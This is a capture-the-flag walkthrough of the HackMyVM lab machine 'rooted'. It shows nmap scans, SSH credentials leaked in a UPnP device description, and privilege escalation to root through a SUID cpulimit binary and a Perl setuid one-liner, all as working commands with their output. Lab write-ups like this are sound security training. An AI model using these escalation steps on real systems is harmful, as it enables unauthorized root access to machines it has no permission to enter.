# rooted

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| rooted | M0rPH3U5 | beginner | hackmyvm |

**Summary:** The rooted machine exposes a limited TCP attack surface consisting of SSH on port 22 and a MiniUPnPd service on port 8888. The UPnP device description XML at /rootDesc.xml contains a friendlyName field set to upnp:nat123!, which discloses the SSH credentials upnp:nat123! in cleartext. These credentials grant SSH access as the upnp user on a Debian GNU/Linux system. Post exploitation SUID enumeration reveals a nonstandard SUID binary at /usr/bin/cpulimit, a tool designed to limit CPU usage of processes. By invoking cpulimit with the fork option and a target of /bin/sh with the privileged flag, the binary spawns a child shell process that inherits the effective user ID of 0 (root). A subsequent Perl POSIX setuid one-liner converts the effective root context into a full real root shell, and both the user and root flags are retrieved from their respective locations.

---

## Reconnaissance

The assessment began with host discovery and comprehensive TCP port scanning against the target.

1. A ping sweep was performed to identify active hosts on the 192.168.56.0/24 network:

```zsh
~/projects/labs/hmv                                                                                                  08:13:33  
❯ nmap -sn 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 08:13 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.00039s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00032s latency).  
Nmap scan report for 192.168.56.146  
Host is up (0.0016s latency).  
Nmap scan report for 192.168.56.147  
Host is up (0.00038s latency).  
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.92 seconds  
```

2. A full TCP port scan was executed against the identified target at 192.168.56.146:

```zsh
~/projects/labs/hmv                                                                                                  08:14:36  
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 08:14 +0700  
Nmap scan report for 192.168.56.146  
Host is up (0.00022s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  
22/tcp   open  ssh  
8888/tcp open  sun-answerbook  

Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds  
```

The scan revealed two open ports: SSH on port 22 and an unrecognized service on port 8888.

3. Service version detection and script scanning were performed against both open ports:

```zsh
~/projects/labs/hmv                                                                                                  08:14:48  
❯ nmap -p 22,8888 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 08:15 +0700  
WARNING: Service 192.168.56.146:8888 had already soft-matched upnp, but now soft-matched rtsp; ignoring second value  
WARNING: Service 192.168.56.146:8888 had already soft-matched upnp, but now soft-matched sip; ignoring second value  
Nmap scan report for 192.168.56.146  
Host is up (0.0010s latency).  

PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)  
8888/tcp open  upnp    MiniUPnP 2.3.9 (UPnP 1.1)  
| fingerprint-strings:  
|   FourOhFourRequest, GetRequest:  
|     HTTP/1.0 404 Not Found  
|     Content-Type: text/html  
|     Connection: close  
|     Content-Length: 134  
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9  
|     Ext:  
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested URL was not found on this server.</BODY></HTML>  
|   GenericLines:  
|     501 Not Implemented  
|     Content-Type: text/html  
|     Connection: close  
|     Content-Length: 149  
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9  
|     Ext:  
|     <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>  
|   HTTPOptions:  
|     HTTP/1.0 501 Not Implemented  
|     Content-Type: text/html  
|     Connection: close  
|     Content-Length: 149  
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9  
|     Ext:  
|     <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>  
|   RTSPRequest:  
|     RTSP/1.0 501 Not Implemented  
|     Content-Type: text/html  
|     Connection: close  
|     Content-Length: 149  
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9  
|     Ext:  
|_    <HTML><HEAD><TITLE>501 Not Implemented</TITLE></HEAD><BODY><H1>Not Implemented</H1>The HTTP Method is not implemented by this server.</BODY></HTML>  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
SF-Port8888-TCP:V=7.991%I=7%D=8/30%Time=6A93841B%P=x86_64-pc-linux-gnu%r(G  
SF:etRequest,126,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20tex  
SF:t/html\r\nConnection:\x20close\r\nContent-Length:\x20134\r\nServer:\x20  
SF:Debian/6\.12\.74\+deb13\+1-amd64\x20UPnP/1\.1\x20MiniUPnPd/2\.3.9\r\nE  
SF:xt:\r\n\r\n<HTML><HEAD><TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><  
SF:H1>Not\x20Found</H1>The\x20requested\x20URL\x20was\x20not\x20found\x20o  
SF:n\x20this\x20server\.</BODY></HTML>\r\n")%r(HTTPOptions,13B,"HTTP/1\.0\  
SF:x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/html\r\nConnectio  
SF:n:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Debian/6\.12\.74\+d  
SF:eb13\+1-amd64\x20UPnP/1\.1\x20MiniUPnPd/2\.3.9\r\nExt:\r\n\r\n<HTML><H  
SF:EAD><TITLE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Imp  
SF:lemented</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x2  
SF:0this\x20server\.</BODY></HTML>\r\n")%r(FourOhFourRequest,126,"HTTP/1\.  
SF:0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\nConnection:\x  
SF:20close\r\nContent-Length:\x20134\r\nServer:\x20Debian/6\.12\.74\+deb13  
SF:\+1-amd64\x20UPnP/1\.1\x20MiniUPnPd/2\.3.9\r\nExt:\r\n\r\n<HTML><HEAD>  
SF:<TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>Not\x20Found</H1>The  
SF:\x20requested\x20URL\x20was\x20not\x20found\x20on\x20this\x20server\.</  
SF:BODY></HTML>\r\n")%r(GenericLines,133,"\x20501\x20Not\x20Implemented\r\  
SF:nContent-Type:\x20text/html\r\nConnection:\x20close\r\nContent-Length:\  
SF:x20149\r\nServer:\x20Debian/6\.12\.74\+deb13\+1-amd64\x20UPnP/1\.1\x20M  
SF:iniUPnPd/2\.3.9\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>501\x20Not\x20Implem  
SF:ented</TITLE></HEAD><BODY><H1>Not\x20Implemented</H1>The\x20HTTP\x20Met  
SF:hod\x20is\x20not\x20implemented\x20by\x20this\x20server\.</BODY></HTML>  
SF:\r\n")%r(RTSPRequest,13B,"RTSP/1\.0\x20501\x20Not\x20Implemented\r\nCon  
SF:tent-Type:\x20text/html\r\nConnection:\x20close\r\nContent-Length:\x201  
SF:49\r\nServer:\x20Debian/6\.12\.74\+deb13\+1-amd64\x20UPnP/1\.1\x20MiniU  
SF:PnPd/2\.3.9\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>501\x20Not\x20Implemente  
SF:d</TITLE></HEAD><BODY><H1>Not\x20Implemented</H1>The\x20HTTP\x20Method\  
SF:x20is\x20not\x20implemented\x20by\x20this\x20server\.</BODY></HTML>\r\n  
SF:");  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 32.25 seconds
```

The service on port 8888 was identified as MiniUPnPd 2.3.9, a UPnP IGD capable router daemon. The server banner disclosed the Debian kernel version and the UPnP protocol version 1.1.

4. The UPnP service was probed with whatweb and curl to examine its HTTP response:

```zsh

~/projects/labs/hmv                                                                                  32s 08:15:32
❯ whatweb http://$ip:8888/                        
http://192.168.56.146:8888/ [404 Not Found] Allegro-RomPager, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9], IP[192.168.56.146], Title[404 Not Found], UncommonHeaders[ext]

~/projects/labs/hmv                                                                                      08:19:23
❯ curl -s -i http://$ip:8888/
HTTP/1.1 404 Not Found
Content-Type: text/html
Connection: close
Content-Length: 134
Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9
Ext:

<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested URL was not found on this server.</BODY></HTML>
```

The root path returned a 404, but the server identified itself as MiniUPnPd. The standard UPnP device description XML file was the next target.

5. The UPnP device description XML was retrieved from the standard endpoint /rootDesc.xml:

```zsh
~/projects/wu/hackmyvm-writeups main*                                                             1m 15s 08:17:52
❯ curl -s http://$ip:8888/rootDesc.xml
<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0" configId="1337"><specVersion><major>1</major><minor>1</minor></specVersion><device><deviceType>urn:schemas-upnp-org:device:InternetGatewayDevice:2</deviceType><friendlyName>upnp:nat123!</friendlyName><manufacturer>Debian</manufacturer><manufacturerURL>https://www.debian.org/</manufacturerURL><modelDescription>Debian with MiniUPnPd version 2.3.9 router</modelDescription><modelName>Router</modelName><modelNumber>1</modelNumber><modelURL>https://miniupnp.tuxfamily.org/</modelURL><serialNumber>00000000</serialNumber><UDN>uuid:06d3f849-68c7-4bd3-9c19-946288bf3209</UDN><serviceList><service><serviceType>urn:schemas-upnp-org:service:Layer3Forwarding:1</serviceType><serviceId>urn:upnp-org:serviceId:L3Forwarding1</serviceId><SCPDURL>/L3F.xml</SCPDURL><controlURL>/ctl/L3F</controlURL><eventSubURL>/evt/L3F</eventSubURL></service></serviceList><deviceList><device><deviceType>urn:schemas-upnp-org:device:WANDevice:2</deviceType><friendlyName>WANDevice</friendlyName><manufacturer>MiniUPnP</manufacturer><manufacturerURL>https://miniupnp.tuxfamily.org/</manufacturerURL><modelDescription>MiniUPnP daemon version 2.3.9</modelDescription><modelName>MiniUPnPd</modelName><modelNumber>20250509</modelNumber><modelURL>https://miniupnp.tuxfamily.org/</modelURL><serialNumber>00000000</serialNumber><UDN>uuid:06d3f849-68c7-4bd3-9c19-946288bf320a</UDN><UPC>000000000000</UPC><serviceList><service><serviceType>urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1</serviceType><serviceId>urn:upnp-org:serviceId:WANCommonIFC1</serviceId><SCPDURL>/WANCfg.xml</SCPDURL><controlURL>/ctl/CmnIfCfg</controlURL><eventSubURL>/evt/CmnIfCfg</eventSubURL></service></serviceList><deviceList><device><deviceType>urn:schemas-upnp-org:device:WANConnectionDevice:2</deviceType><friendlyName>WANConnectionDevice</friendlyName><manufacturer>MiniUPnP</manufacturer><manufacturerURL>https://miniupnp.tuxfamily.org/</manufacturerURL><modelDescription>MiniUPnP daemon version 2.3.9<... (line truncated to 2000 chars)
```

The XML device description contained a critical information disclosure in the friendlyName field:

```zsh
<friendlyName>upnp:nat123!</friendlyName>
```

The friendlyName field was set to `upnp:nat123!`, which directly disclosed the SSH credentials `upnp:nat123!` in cleartext as part of the UPnP device metadata.

---

## Initial Access

### SSH Authentication with UPnP Disclosed Credentials

6. Using the credentials recovered from the UPnP device description, an SSH session was established:

```zsh
~/projects/labs/hmv                                                                                              38s 08:25:14  
❯ ssh upnp@$ip  
upnp@192.168.56.146's password:   
Linux rooted 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64  

The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Sun Aug 30 03:24:41 2026 from 192.168.56.1  
upnp@rooted:~$ id;whoami;hostname  
uid=1000(upnp) gid=1000(upnp) groupes=1000(upnp),100(users)  
upnp  
rooted  
```

Access was gained as the upnp user (UID 1000) on a Debian GNU/Linux system named rooted.

7. Initial post exploitation enumeration was performed, confirming no sudo access and examining SUID binaries:

```zsh
upnp@rooted:~$ ls -la  
total 32  
drwx------ 3 upnp upnp 4096 11 juin  16:31 .  
drwxr-xr-x 3 root root 4096 11 juin  16:14 ..  
-rw------- 1 upnp upnp   27 30 août  03:25 .bash_history  
-rw-r--r-- 1 upnp upnp  220 11 juin  16:10 .bash_logout  
-rw-r--r-- 1 upnp upnp 3526 11 juin  16:10 .bashrc  
drwxrwxr-x 3 upnp upnp 4096 11 juin  16:11 .local  
-rw-r--r-- 1 upnp upnp  807 11 juin  16:10 .profile  
-rw-rw-r-- 1 upnp upnp   65 11 juin  16:12 user.txt  
upnp@rooted:~$ cat .bash_history   
history -w  
exit  
upnp@rooted:~$ cat /etc/passwd | grep "sh$"  
root:x:0:0:root:/root:/bin/bash  
upnp:x:1000:1000,,,:/home/upnp:/bin/bash  
upnp@rooted:~$ sudo -l  
[sudo] Mot de passe de upnp:   
Désolé, l'utilisateur upnp ne peut pas utiliser sudo sur rooted.  
upnp@rooted:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null  
-rwsr-xr-x 1 root root 494144  5 avril 01:29 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-x 1 root root 18744 17 janv.  2025 /usr/lib/polkit-1/polkit-agent-helper-1  
-rwsr-xr-- 1 root messagebus 51272  8 mars   2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper  
-rwsr-xr-x 1 root root 31352 17 mai    2024 /usr/bin/cpulimit  
-rwsr-xr-x 1 root root 18816 10 mai    2025 /usr/bin/newgrp  
-rwsr-xr-x 1 root root 55688 10 mai    2025 /usr/bin/umount  
-rwsr-xr-x 1 root root 118168 19 avril 2025 /usr/bin/passwd  
-rwsr-xr-x 1 root root 88568 19 avril 2025 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 72072 10 mai    2025 /usr/bin/mount  
-rwsr-xr-x 1 root root 70888 19 avril 2025 /usr/bin/chfn  
-rwsr-xr-x 1 root root 306456 11 févr.  2026 /usr/bin/sudo  
-rwsr-xr-x 1 root root 52936 19 avril 2025 /usr/bin/chsh  
-rwsr-xr-x 1 root root 84360 10 mai    2025 /usr/bin/su  
```

The sudo check confirmed no elevated privileges for the upnp user. The SUID enumeration revealed a nonstandard binary at `/usr/bin/cpulimit` owned by root with the SUID bit set. Additionally, capabilities were checked:

```zsh
upnp@rooted:~$ /usr/sbin/getcap -r / 2>/dev/null  
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep  
```

The only capability finding was on a GStreamer helper binary, which was not directly exploitable for privilege escalation. The cpulimit SUID binary became the focus of the escalation effort.

---

## Privilege Escalation

### cpulimit SUID Binary Exploitation

8. The cpulimit binary was exploited by using its fork functionality to spawn a child shell process that inherits the effective user ID of 0:

```zsh
upnp@rooted:~$ cpulimit -l 100 -f -- /bin/sh -p  
Process 997 detected  
# id    
uid=1000(upnp) gid=1000(upnp) euid=0(root) groupes=1000(upnp),100(users)  
# which python3  
# which perl  
/usr/bin/perl  
# perl -e 'use POSIX qw(setuid setgid); $ENV{PATH}="/usr/bin:/bin"; POSIX::setgid(0); POSIX::setuid(0); exec "/bin/bash";'  
root@rooted:~# su -  
root@rooted:~# id;whoami;hostname  
uid=0(root) gid=0(root) groupes=0(root)  
root  
rooted  
root@rooted:~# cat /home/upnp/user.txt /root/root.txt   
70f... 
371...
```

The cpulimit binary with the `-f` (fork) flag spawned a child process running `/bin/sh -p`, which inherited the SUID root effective user ID. The `euid=0(root)` context was then converted to a full real UID root shell using a Perl POSIX setuid one-liner. A subsequent `su -` established a clean login shell with `uid=0(root) gid=0(root)`, and both the user flag from `/home/upnp/user.txt` and the root flag from `/root/root.txt` were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap TCP scanning identified SSH on port 22 and a MiniUPnPd 2.3.9 UPnP service on port 8888. The device description XML at /rootDesc.xml was retrieved via curl.
2. **Vulnerability Discovery**: The UPnP device description XML contained a friendlyName field set to upnp:nat123!, which directly disclosed the SSH credentials in cleartext as part of the device metadata.
3. **Exploitation**: The leaked credentials were used to establish an SSH session as the upnp user, gaining initial foothold on the Debian Linux system named rooted.
4. **Internal Enumeration**: SUID binary enumeration revealed a nonstandard cpulimit binary at /usr/bin/cpulimit owned by root with the SUID bit set. The sudo configuration confirmed no elevated privileges for the upnp user.
5. **Privilege Escalation**: The cpulimit binary was invoked with the fork flag to spawn a child shell inheriting euid=0, and a Perl POSIX setuid one-liner converted the effective root context into a full real root shell, allowing retrieval of both the user and root flags.
